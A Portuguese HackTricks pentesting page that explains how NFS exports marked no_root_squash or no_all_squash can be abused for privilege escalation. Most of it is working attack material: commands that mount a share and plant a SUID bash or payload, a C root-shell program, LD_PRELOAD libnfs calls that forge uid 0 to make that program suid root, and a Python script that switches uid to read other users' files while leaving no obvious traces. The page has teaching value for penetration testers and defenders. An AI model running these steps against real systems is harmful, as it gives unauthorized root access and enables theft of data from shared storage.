Leia o arquivo _**/etc/exports**_, se você encontrar algum diretório configurado como **no\_root\_squash**, então você pode **acessá-lo** como **cliente** e **escrever dentro** desse diretório **como se** você fosse o **root** local da máquina.

**no\_root\_squash**: Essa opção basicamente dá autoridade ao usuário root no cliente para acessar arquivos no servidor NFS como root. E isso pode levar a sérias implicações de segurança.

**no\_all\_squash:** Isso é semelhante à opção **no\_root\_squash**, mas se aplica a **usuários não-root**. Imagine que você tenha um shell como usuário nobody; verifique o arquivo /etc/exports; a opção no\_all\_squash está presente; verifique o arquivo /etc/passwd; emule um usuário não-root; crie um arquivo suid como esse usuário (montando usando nfs). Execute o suid como usuário nobody e torne-se um usuário diferente.

# Escalação de Privilégios

## Exploração Remota

Se você encontrou essa vulnerabilidade, pode explorá-la:

* **Montando esse diretório** em uma máquina cliente e, **como root, copiando** dentro da pasta montada o binário **/bin/bash** e dando a ele direitos **SUID**, e **executando a partir da máquina vítima** esse binário bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montando esse diretório** em uma máquina cliente, e **como root copiando** dentro da pasta montada nosso payload compilado que irá abusar da permissão SUID, dar a ele direitos de **SUID**, e **executar a partir da máquina vítima** esse binário (você pode encontrar aqui alguns [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Exploração Local

{% hint style="info" %}
Observe que, se você puder criar um **túnel da sua máquina para a máquina da vítima, ainda poderá usar a versão remota para explorar essa escalada de privilégios, tunelando as portas necessárias**.\
O truque a seguir é no caso de o arquivo `/etc/exports` **indicar um endereço IP**. Nesse caso, você **não poderá usar** em nenhum caso a **exploração remota** e precisará **abusar desse truque**.\
Outro requisito necessário para que a exploração funcione é que **a exportação dentro de `/etc/export`** **deve estar usando a flag `insecure`**.\
\--_Não tenho certeza se esse truque funcionará se `/etc/export` estiver indicando um endereço IP_--
{% endhint %}

**Truque copiado de** [**https://www.errno.fr/nfs\_privesc.html**](https://www.errno.fr/nfs\_privesc.html)

Agora, vamos supor que o servidor de compartilhamento ainda esteja executando `no_root_squash`, mas há algo impedindo que montemos o compartilhamento em nossa máquina de teste de penetração. Isso aconteceria se o `/etc/exports` tivesse uma lista explícita de endereços IP permitidos para montar o compartilhamento.

Listar os compartilhamentos agora mostra que apenas a máquina em que estamos tentando obter privilégios é permitida para montá-lo:
```
[root@pentest]# showmount -e nfs-server
Export list for nfs-server:
/nfs_root   machine
```
Isso significa que estamos presos explorando o compartilhamento montado na máquina localmente a partir de um usuário não privilegiado. Mas acontece que há outro exploit local menos conhecido.

Este exploit depende de um problema na especificação NFSv3 que exige que seja responsabilidade do cliente anunciar seu uid/gid ao acessar o compartilhamento. Assim, é possível falsificar o uid/gid forjando as chamadas NFS RPC se o compartilhamento já estiver montado!

Aqui está uma [biblioteca que permite fazer exatamente isso](https://github.com/sahlberg/libnfs).

### Compilando o exemplo <a href="#compiling-the-example" id="compiling-the-example"></a>

Dependendo do seu kernel, você pode precisar adaptar o exemplo. No meu caso, tive que comentar as chamadas de sistema fallocate.
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Explorando usando a biblioteca <a href="#exploiting-using-the-library" id="exploiting-using-the-library"></a>

Vamos usar o exploit mais simples:
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
Coloque nosso exploit no compartilhamento e torne-o suid root falsificando nosso uid nas chamadas RPC:
```
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
Tudo o que resta é executá-lo:
```
[w3user@machine libnfs]$ /mnt/share/a.out
[root@machine libnfs]#
```
Aqui estamos, escalonamento de privilégios local root!

## Bônus NFShell <a href="#bonus-nfshell" id="bonus-nfshell"></a>

Uma vez com privilégios de root local na máquina, eu queria saquear o compartilhamento NFS em busca de possíveis segredos que me permitissem fazer um pivô. Mas havia muitos usuários do compartilhamento, cada um com seus próprios uids que eu não conseguia ler, apesar de ser root, por causa da incompatibilidade de uid. Eu não queria deixar rastros óbvios, como um chown -R, então criei um pequeno trecho de código para definir meu uid antes de executar o comando de shell desejado:
```python
#!/usr/bin/env python
import sys
import os

def get_file_uid(filepath):
    try:
        uid = os.stat(filepath).st_uid
    except OSError as e:
        return get_file_uid(os.path.dirname(filepath))
    return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Você pode então executar a maioria dos comandos normalmente, prefixando-os com o script:
```
[root@machine .tmp]# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
[root@machine .tmp]# ls -la ./mount/9.3_old/
ls: cannot open directory ./mount/9.3_old/: Permission denied
[root@machine .tmp]# ./nfsh.py ls --color -l ./mount/9.3_old/
drwxr-x---  2 1008 1009 1024 Apr  5  2017 bin
drwxr-x---  4 1008 1009 1024 Apr  5  2017 conf
drwx------ 15 1008 1009 1024 Apr  5  2017 data
drwxr-x---  2 1008 1009 1024 Apr  5  2017 install
```
<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Você trabalha em uma **empresa de segurança cibernética**? Você quer ver sua **empresa anunciada no HackTricks**? ou você quer ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!

- Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)

- **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Compartilhe seus truques de hacking enviando PRs para o [repositório hacktricks](https://github.com/carlospolop/hacktricks) e [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
